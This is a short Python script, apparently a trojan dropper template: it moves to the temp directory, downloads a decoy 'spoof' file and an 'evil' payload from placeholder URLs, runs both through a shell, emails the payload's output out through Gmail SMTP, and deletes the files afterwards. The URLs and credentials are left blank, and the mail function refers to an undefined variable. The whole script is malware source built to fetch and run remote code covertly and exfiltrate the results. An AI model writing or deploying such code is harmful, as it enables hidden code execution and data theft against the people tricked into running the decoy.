#!/usr/bin/env python3

import requests, os, tempfile, subprocess, smtplib

def remove(spoof_file, evil_file):
    # Removes the downloaded file
    os.remove(spoof_file)
    os.remove(evil_file)

def send_mail_report(username, password, data):
    # Sends the mail with the ouput of the command with specified account
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(username, password)
    server.sendmail(email, email, data)
    server.quit()


def execute(spoof_file, evil_file):
    # Executes the files
    subprocess.Popen(spoof_file, shell=True)
    output = subprocess.check_output(evil_file, shell=True)
    #or
    # subprocess.call(evil_file, shell=True)
    return output

def download(url):
    # Downloads the files to the temporary directory
    get_response = requests.get(url)
    # print(get_request.content)
    file_name = url.split("/")[-1]

    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

    return file_name

def change_temp_dir():
    # Changes the directory to temporary directory
    temp_dir = tempfile.gettempdir()
    # print(temp_dir)
    os.chdir(temp_dir)


# main code
url1 = ""       #spoof file
url2 = ""       #evil file
username = ""
password = ""

change_temp_dir()
spoof_file = download(url1)
evil_file = download(url2)
output = execute(spoof_file, evil_file)
send_mail_report(username, password, output)
remove(spoof_file, evil_file)

